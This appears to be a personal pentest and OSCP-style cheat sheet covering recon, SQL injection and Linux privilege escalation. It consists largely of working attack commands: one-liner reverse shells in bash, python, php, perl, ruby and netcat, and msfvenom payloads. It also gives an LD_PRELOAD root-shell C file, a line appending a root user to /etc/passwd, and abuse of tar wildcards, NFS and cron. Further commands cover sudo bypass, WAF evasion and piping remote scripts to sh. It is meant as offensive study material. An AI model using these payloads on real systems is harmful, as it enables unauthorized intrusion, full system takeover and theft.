# 1. Recon

## quick inventory

- [arsenal](https://github.com/Orange-Cyberdefense/arsenal)

## wordlist

- fzf-wordlists
```bash
find -L /usr/share/wordlists -type f | fzf
```
- [seclists](https://github.com/danielmiessler/SecLists)

## integrated scanner

- [nmap](https://github.com/nmap/nmap)
```bash
# 扫描全端口，用默认脚本探测版本
nmap -n -v -Pn -sS -p- $IP --max-retries=0
nmap -n -v -sC -sV -p $Ports $IP

# 寻找目标IP
nmap -sn $IP/24
# TCP|UDP扫描全端口
nmap -sT --min-rate 10000 -p- $IP && \
nmap -sU --min-rate 10000 -p- $IP
# 使用默认脚本TCP扫描具体端口+版本信息+OS信息
nmap -sT -sV -sC -O -p $Ports $IP
# 使用漏洞脚本扫描固定端口
nmap --script-vuln -p $Ports $IP

# 一句话全模式扫描开放端口
nmap -A $IP -oA nmap/all -p`nmap -sS -sU -Pn -p- $IP --min-rate 10000 | grep '/tcp\|/udp' | awk -F '/' '{print $1}' | sort -u | tr '\n' ','`
```
- [AutoRecon](https://github.com/Tib3rius/AutoRecon)
```bash
autorecon -t <target>
```
- [RustScan](https://github.com/RustScan/RustScan)
```bash
rustscan <target> --no-nmap -ulimit 10000
```
- [reconftw](https://github.com/six2dez/reconftw)
```bash
./reconftw.sh -d target.com -r
```

## host and port

- nmap (host and port)
```bash
nmap -sn $IP/24
nmap -sU -sC -O --min-rate 10000 -p- $IP; \
nmap -sT -sC -O --min-rate 10000 -p- $IP
```
- ping (host)
```bash
# ping ip存在与否
ping -c 3 -W 1 $IP
# ping ip/24下ip存在与否
for i in {1..254}; do ping -c 1 -W 1 $sub_IP.$i | grep from; done
```
- nc (port)
```bash
nc.traditional -vv -z $IP 1-65535 2>&1 | grep -v refused
```
- tcp (port)
```bash
IP=xxx.xxx.xxx.xxx
for i in {1..65535}
do
    (echo < /dev/tcp/$IP/$i) &>/dev/null && \ 
    printf "\n[+] Open port: %d\n" "$i" || printf "."
done
```

## web scanner

- [whatweb](https://github.com/urbanadventurer/WhatWeb)
```bash
whatweb [opts] <urls>
```
- [nikto](https://github.com/sullo/nikto)
```bash
nikto -h <taget.com> -p <port> [-id admin:passwd] [-Plugins +apacheversion] [-ssl] -o <output>
```



## web path

- [dirb](https://www.kali.org/tools/dirb/)
```bash
dirb $IP $Wordlist
```
- [dirsearch](https://github.com/maurosoria/dirsearch)
	- -t \<thead\>
	- -r, brute-force recursively
	- -i \<code\>, include status codes
	- -x \<codes\>, exclude status codes
	- -m \<method\>
	- -d \<data\>
	- -H \<headers\>
	- --user-agent=\<ua\>
	- --cookie=\<ck\>
```bash
dirsearch -u <target> -e <extensions> [options]
```
- [ffuf](https://www.kali.org/tools/ffuf/)
```bash
ffuf -fs 185 -c -w \$(fzf-wordlists) -H 'Host: FUZZ.org' -u "http://$TARGET/"
ffuf -w /usr/share/dirb/wordlists/common.txt -fc 403,404 -fs 185 -u "http://$TARGET/FUZZ" -p 1
```
- [gobuster](https://github.com/OJ/gobuster)
```bash
gobuster dir -u <target.com> -w <word> -t 50
```
- [feroxbuster](https://github.com/epi052/feroxbuster)
```bash
feroxbuster -u <target.com> -x pdf -w <word> -t 50
```
- [wfuzz](https://wfuzz.readthedocs.io/en/latest/)
```bash
wfuzz -w <word> --hc 404 <target.com>
```
- [nikto](https://github.com/sullo/nikto)
```bash
nikto -h <target.com> -mutate 1 -mutate-options /path/to/dictionary.txt
```

## ipv6

- nmap
```bash
nmap -6 --min-rate 10000 -p- $IPv6
```

## os

- web yes
	- Windows大小写不敏感
	- 工具识别
- web no
	- nmap -O
- TTL (not accurate)
```
1、WINDOWS NT/2000   TTL：128
2、WINDOWS 95/98     TTL：32
3、UNIX              TTL：255
4、LINUX             TTL：64
5、WIN7              TTL：64
```
- special port: 22, 139, 445, 1433, 3389

## database

- default pair
	- asp + access/mssql
	- aspx + mssql
	- php + mysql
	- jsp + mysql/oracle
	- python + mongodb
- common port
	- SQL
		- mysql, 3306
		- sqlserver, 1433
		- oracle, 1521
		- postgresql, 5432
	- NoSQL
		- mongodb, 27017
		- redis, 6379
		- memcached, 11211

## smb

- [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)
```bash
enum4linux -A $IP
```

## dns

- local host config
	- linux/unix/macos: `/etc/resolv.conf`
	- windows: `%windir%\system32\drivers\etc\hosts`
- [dig](https://www.kali.org/tools/bind9/#dig)
```bash
dig @<dns> <domain> [+short]
```
- [nslookup](https://www.kali.org/tools/bind9/#nslookup)
```bash
nslookup [-qt=A|AAAA|CNAME|MX|.] <target.com> <dns>
```
- [whois](https://www.kali.org/tools/whois/#whois)
```bash
whois <target.com>
```
- [theHaverster](https://github.com/laramies/theHarvester)
	- email
	- subdomain
	- name
```bash
theHarvester -d $DOMAIN_NAME -b google
```
- [crt.sh](https://crt.sh)

## domain

- [netcraft: search web by domain](https://searchdns.netcraft.com)

## subdomain

- [gobuster](https://github.com/OJ/gobuster)
```bash
# fzf-wordlists
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
# gobuster
gobuster dns   -u <http://target.com> -w /path/to/wordlist.txt --append-domain -t $THREAD_NUM
gobuster vhost -u <http://target.com> -w /path/to/wordlist.txt --append-domain -t $THREAD_NUM
```

## cdn

- online ping
	- [http://ping.chinaz.com/](http://ping.chinaz.com/)
	- [http://ping.aizhan.com/](http://ping.aizhan.com/)
	- [http://ce.cloud.360.cn/](http://ce.cloud.360.cn/)
	- [https://ip.tool.chinaz.com/](https://ip.tool.chinaz.com/)
	- [https://get-site-ip.com/](https://get-site-ip.com/)
	- [https://tools.ipip.net/cdn.php/](https://tools.ipip.net/cdn.php/)
- nslookup <target.com>

## waf

- [waf00f](https://github.com/EnableSecurity/wafw00f)
- [identYwaf](https://github.com/stamparm/identywaf)
- nmap
	- nmap --script=http-waf-fingerprint
	- nmap --script=http-waf-detect

## web source code

- 目录结构
	- 后台目录
	- 模板目录
	- 数据库目录
	- 数据库配置文件
- 脚本类型
	- asp
	- php
	- jsp
	- java
- 应用分类
	- 门户
	- 电商
	- 论坛
	- 博客
- 其他补充
	- 框架or非框架
	- CMS识别
	- 开源or闭源
	- 源码获取

## website

1. 目录型站点（例如，www.xxx.com/bbs）
	- 主站的漏洞
	- 子站的漏洞
2. 端口类站点
	- shodan扫描
3. 子域名站点
	- 子域名和域名可能不在一个服务器上
4. 类似域名站点
	- 原有域名弃用，但是还能访问
	- 二级or顶级域名更换，旧域名找到突破口
	- 社工方式找到相关域名信息
5. 旁注，C段站点（在线工具：[https://www.webscan.cc/](https://www.webscan.cc/)）
	1. 旁注：同一个服务器上面存在多个站点、但是你要攻击的是A网站由于各种原因不能完成安全测试。就通过测试B网站进入服务器然后在攻击A网站最终实现目的。
	2. C段：不同的服务器上面存在不同的网站，通过扫描发现与你渗透测试的是同一个网段最终拿下服务器、然后通过内网渗透的方式拿下渗透服务器。
6. 搭建软件特征站点
	- 有的网站是借助于第三方的集成搭建工具实现例如：PHPstudy、宝塔等环境这样的集成环境搭建的危害就是泄露了详细的版本信息。
	- phpstudy搭建了之后在默认的站点安装了phpmyadmin有的网站没有做安全性直接可以通过 用户名root~密码root 登录进入

## asset

- github
- search
	- subdomain
	- dns
	- cdn
	- 备案、证书
- search engine
	- fofa
	- shodan
	- zoomeye

# 2. Vulns

Reference:

- [OWASP Top10](https://github.com/OWASP/Top10)

## 2.1 Injection

- when vulnerable
	- user-supplied data is not validated, filtered, sanitized
	- dynamic queries or non-parameterized calls (without context-aware escaping) are used directly in the interpreter
	- hostile data is used with orm search parameters to extract additional, sensitive data
	- hostile data is directly used or concatenated to generate structure and malicious data in dynamic queries, commands, stored procedures
- how to prevent: keep data seperate from commands and queries
	- a safe API
	- positive server-side input validation
	- escape speacial characters (by specific escape syntax for interpreter)
	- limit mass disclosure of records (SQLi, by controls like LIMIT and etc)

### SQL Injection

reference
- [SQL Injection Cheat Sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

content summ

- 数据库类型
	- access
	- mysql
	- mssql
	- oracle
	- postsql
	- sqllist
	- mongodb
- 提交方法
	- GET
	- POST
	- Cookie
	- Request
	- HTTP Header
- 数据类型
	- 数字型
	- 字符型
- 常用关键字
	- select
	- insert
	- delete
	- update
	- order by
- 常用函数
	- 查询数据库
		- version()
	- 数据库名称
		- database()
	- 数据库用户
		- user()
	- 操作系统
		- @@version_compile_os
	- 文件读写操作
		- load_file()
		- into outfile
- 有无回显
	- 回显注入
	- 盲注 (blind inj)
	- 延时注入 (time delay)
	- 布尔注入 (boolean-based inj)
	- 报错注入 (error-based inj)
	- Union注入
- 注入扩展
	- 加解密注入
	- JSON注入
	- LADP注入
	- DNSlog注入
	- 二次注入
	- 堆叠注入
- WAF
	- 更改提交方式
	- 大小写混合
	- 加解密编解码
	- 等价函数替换
	- 特殊符号混用
	- 数据库特性
	- HTTP参数污染
		- 如果出现多个相同参数，不同的服务器搭建网站会出现参数接受的差别，从而令原有的参数失效。
		- PHP+Apache, $\_GET("param") -> Last
		- JSP+Tomcat, Request.getParameter("param") -> First
		- Perl+Apache, Param("param") -> First
		- Python+Apache, Getvalue("param") -> All(list)
		- ASP+IIS, Request.QueryString("param") -> All(comma)
	- 垃圾数据溢出
	- 注释符混用
	- 反序列化
	- Fuzz
- WAF绕过
	- IP白名单 (伪造客户端IP, http header)
		- x-forwarded-for
		- x-remote-ip
		- x-originating-ip
		- x-remote-addr
		- x-read-ip
	- 静态资源
		- .css
		- .js
		- .swf
		- .jpg
	- URL白名单
	- 爬虫白名单
		- user-agent
			- Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)
			- Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html)
		- 通过行为判别
	- URL编码
	- 客制化自动化工具
- 防御方案
	- 代码加载过滤
	- WAF部署

#### 注入点判断

```
# 数字型
and 1 = 1 --
and 1 = 2 -- 

# 字符型
' and 1 = 1 -- 
' and 1 = 2 -- 

# order by 判断回显个数
data order by 1; data order by 2; ...
data' order by 1; data' order by 2; ...
```

#### information_schema 的利用

适用范围
- mysql
- postgresql
- sql server (mssql)

利用方式
- select * from information_schema.schemata
- where table_schama = ''
- select * from information_schema.tables
- where table_name = ''
- select * from information_schema.columns
- where column_name = ''

#### sqlmap usage

- [github page](https://github.com/sqlmapproject/sqlmap)
- [kali doc page](https://www.kali.org/tools/sqlmap/#sqlmap)

```bash
# GET
sqlmap -u <url>
# POST
sqlmap -u <url> --data "<POST data>" -p <param>

# Dump data
sqlmap -u <url> ... --dbs
sqlmap -u <url> ... -D <db> --tables
sqlmap -u <url> ... -D <db> -T <tb> --columns
sqlmap -u <url> ... -D <db> -T <tb> -C <col> --dump

# Get shell
sqlmap -u <url> --os-shell

# Injection Techniques
	##B(boolean-based blind), E(error-based), U(union query-based), S(stacked queries), T(time-based blind), Q(inline queries)
sqlmap -u <url> ... --technique=BEUSTQ

# bypass waf by ua exchange
sqlmap -u <url> ... --random-agent
sqlmap -u <url> ... --user-agent="Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html)"
```

#### 注入类型

- 布尔注入
- 报错注入
- UNION注入
- 堆叠注入
- 时间盲注
- 内联查询
- DNSlog注入
	- http:/ceye.io/
	- https://github.com/ADOOO/DnslogSqlinj

#### HTTP 参数控制

![](00.asset/Pasted%20image%2020230710063615.png)

#### 表达式表达数字

![](00.asset/Pasted%20image%2020230710064222.png)

### Command Injection

### ORM Injection

### Server-side Template Injection

reference:
- https://portswigger.net/research/server-side-template-injection

### XSS

## 文件上传

## CSRF

## 反序列化

## 代码审计

# 3. Linux Privilege Escalation

## quick server

```bash
python -m http.server 80
php -S 0:80
```

## better shell

- 获得一个舒服的shell
```bash
# Host
rlwrap nc -lvnp 4444

# Remote
export TERM=xterm-color
dpkg -l | grep python # which python
python -c "import pty;pty.spawn('/bin/bash')"
##After ctrl+z
stty raw -echo; fg
```
- [shellcheck](https://www.shellcheck.net)
- [explainshell](https://explainshell.com)

## reverse shell

reference:
- [online generator](https://www.revshells.com)

cheatsheet:
- elf file
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<Host> LPORT=<p> -f elf -o rshell.elf
```
- bash
```bash
bash -i >& /dev/tcp/<host>/4444 0>&1
```
- python
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
- php
```bash
php -r '$sock=fsockopen("10.134.188.54",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```
- perl
```bash
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
- ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
- netcat
```bash
nc -e /bin/sh <host> 4444
```

## 提权原理

- 低权限可以修改可执行文件or脚本，再以高权限身份运行
- 低权限的运维人员也会记录、使用备份程序，再以高权限完成操作
- 在权限体系的上层捕捉、拦截、修改凭据信息or权限信息

## methodology

主流

- [UGO](03.pe/UGO.md)
- [SUID, SGID](./03.pe/SUID-SGID)
- Capabilities
- AppArmor, Selinux
- ACL

其他

- Grsecurity
- Pax
- ExecShield
- ASLR
- TOMOYO Linux
- SMACK
- Yama
- CGroups
- Linux Namespaces
- StackGuard
- Proplice
- seccomp
- ptrace
- capsicum
- Mprotect
- chroot
- firejail

在线

- [GTFOBins](https://gtfobins.github.io/)

## 手工枚举

- 系统枚举
	- 用户信息
		- whoami
		- id \[username\]
		- who
		- w
		- last
	- uname -a
	- lsb_release -a
	- cat /proc/version
	- cat /etc/issue
	- hostname, hostnamectl
	- 网络信息
		- ip addr (ifconfig)
		- ip route (route)
		- ip neigh
		- arp -a
		- netstat -a\[t|u\] \[-l\]
		- netstat -s
		- netstat -ano
- sudo -l
- getcap -r / 2>/dev/null
- ls -liah
- history
- cat /etc/passwd
- cat /etc/shadow
- cat /etc/crontab
- echo $PATH
- env
- 进程信息
	- ps -ef
	- ps axjf
	- ps aux
	- top -n 1
- find / -perm -u=s -type f 2>/dev/null
- which pkg 2>/dev/null
	- awk sed
	- perl python ruby
	- gcc g++
	- vi vim
	- nmap
	- find
	- netcat nc
	- wget curl tftp ftp
	- tmux screen
- 未挂载文件系统
	- cat /etc/fstab

## 自动枚举

- [PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
- [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) written by py
- [unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)

How to use tools
```bash
# 1. wget or curl down
wget <tool.url>
curl -O <tool.url>

# 2. curl script and execute
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 3. local network
##with curl
sudo python3 -m http.server 80 #Host
curl <HOST>/linpeas.sh | sh    #Victim

##without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/<HOST>/80 | sh      #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out                   #Host
curl <HOST>:8000/linpeas.sh | sh | nc <HOST> 9002 #Victim

# Read output on host
less -r linpeas.out
```

## 密码相关

### 加密算法

常见密文开头和加密方式

- md5: $1
- bcrypt, blowfish: $2, $2a, $2b, $2y
- sha-512: $6
- sha-256: $5

工具识别

- hash-identifier

### 生成密码

- openssl
```bash
# generate a user line
openssl passwd -1 -salt qwe qwe > hash.txt
# Append this line into passwd file
echo 'qwe:$1$qwe$D95bkH3CwpH6ffYU7pu0m/:0:0:root:/root:/bin/bash' >> /etc/passwd
```
- mkpasswd
```bash
mkpasswd -m sha-512 qwe
```

### 破解密码

- john
```bash
john --worldlist=/usr/share/wordlists/rockyou.txt <hash>
```

## 提权方式

- /etc/shadow 文件
	- 可读：获得root密文，破解密码
	- 可写：修改root密文
- /etc/passwd 文件可写
	- 新添加一行有root权限的用户
	- 修改root用户行的 x 为密文
- sudo 预加载环境变量
	- sudo -l
	- env_reset
	- env_keep+=LD_PRELOAD
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

// filename: shell.c
// define a shared object
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash -p");
}
```
```bash
vim shell.c
gcc -fPIC -shared -nostartfiles -o shell.so shell.c
# 寻找不需要密码就可以以root身份执行的程序
sudo LD_PRELOAD=/tmp/shell.so find
```
- 自动任务文件权限: [cron](00.basic/linux/cron)
	- cat /etc/crontab
	- 修改有root执行权限的脚本；写入reverse shell
	- bash -i >& /dev/tcp/\<Host\>/4444 0>&1
- 自动任务PATH环境变量
	- 在cron指定的PATH变量中寻找可写地址
	- 构建有root执行权限的脚本，且路径为相对路径；写入提权脚本
```bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```
- 自动任务通配符
	- 有root权限执行的脚本，固定在某路径tar打包文件
	- 利用 [tar](00.basic/linux/tar) 命令的 --checkpoint 和 --checkpoint-action 提权
```bash
# on host
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<Host> LPORT=4444 -f elf -o rshell.out # and send to target machine
rlwrap nc -lvnp 4444

# on target
cd /xxx/yyy
wget http://<Host>:80/rshell.out
## `--checkpoint=1` 是 `touch` 命令的一个选项，用于创建一个检查点文件
## `--checkpoint-action` 选项则用于在每个检查点处执行指定的操作
touch --checkpoint=1
touch --checkpoint-action=exec=rshell.out
```
- SUID 可执行文件已知利用
	- find / -perm -u=s -type f 2>/dev/null
	- searchsploit
	- [gtfobins](https://gtfobins.github.io/)
- SUID 共享库注入
- SUID 环境变量利用
- SUID-shell 功能利用
- 密码和密钥历史文件
	- history
	- cat ~/.\*history | less
	- cat ~/.viminfo
	- e.g. mysql -h somehost.local -uroot -ppassword123
- 密码和密钥配置文件查看
	- 配置文件概要
		- vpn (.ovpn)
		- ssh (.ssh)
- SSH 密钥敏感信息
	- 寻找泄露的私钥
	- touch id_rsa && vim id_rsa && chmod 600 id_rsa
	- ssh -i id_rsa root@\<IP\>
		- \[-oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dds\]
		- \[-oHostKeyAlgorithms=ssh-rsa,ssh-dds\]
- [NFS](00.basic/service/nfs) 提权
	- cat /etc/exports
```bash
# Remote
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

# Host on root
mkdir /tmp/nfs
##`-o`后面跟着一系列以逗号分隔的选项，用于指定文件系统的挂载参数
##`rw`表示将文件系统以读写模式挂载
##`vers=3`表示使用NFS版本3来挂载文件系统
mount -o rw,vers=3 <remote_ip>:/tmp /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs shell.elf
```
- 内核利用
	- linpeas扫描，内核版本低时可能有内核漏洞
	- searchsploit -m 40611 40839
- [doas](00.basic/linux/doas) less+vi
	- freedsd, openbsd
	- find / -perm -u=s -type f 2>/dev/null: /usr/bin/doas
	- cat /etc/doas.conf
	- doas /usr/bin/less /var/log/authlog. v(use vi to edit this file)
	- :!sh
- [MOTD](00.basic/linux/motd) 机制利用
	- vim /etc/update-motd.d/00-header 写入rshell
	- bash -c "bash -i >& /dev/tcp/\<host_ip\>/4444 0>&1"
- 可预测 PRNG 暴力破解 SSH
	- 公钥放在服务器端，私钥放在用户端，连接方式：用私钥去连接公钥
	- cat ~/.ssh/authorized_keys
	- searchsploit prng (pseudo random number generator 伪随机数生成器)
	- searchsploit -m 5622.txt

## sudo 提权利用

- Reference: [GTFOBins](https://gtfobins.github.io)
- [sudo](00.basic/linux/sudo) 使用概要
- (ALL, !root) NOPASSWD: /bin/bash
	- sudo version <= 1.8.27, security bypass
	- cve-2019-14287
```bash
sudo -u#-1 /bin/bash
```
- apt
```bash
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
```
- apache2
```bash
# 报错信息泄露
sudo apache2 -f /etc/shadow
```
- ash
```bash
# ash 本身就是一个 shell
sudo ash
```
- awk
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

# 4. Post Pentest

# 5. AWD

# 6. Social Engineer

# 7. Software Engineer

# Appendix. 靶场

- [ ] [OSCP练习推荐靶场库](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8)

# Appendix. 效率工具

- vim
- tmux

# Appendix. 学习资料

- Linux Privilege Escalation from 红队笔记
	- [ ] [Linux提权精讲：原理和枚举](https://www.bilibili.com/video/BV1Wh4y1H7LK)
	- [ ] [Linux提权精讲：演示1 - 服务漏洞利用提权](https://www.bilibili.com/video/BV19s4y1D7Mt)
	- [ ] [Linux提权精讲：演示2 - 20种Linux渗透测试提权演示精讲](https://www.bilibili.com/video/BV1Es4y1M7ZL)
	- [ ] [Linux提权精讲：Sudo风暴全70讲](https://www.bilibili.com/video/BV1DV4y1U7bT)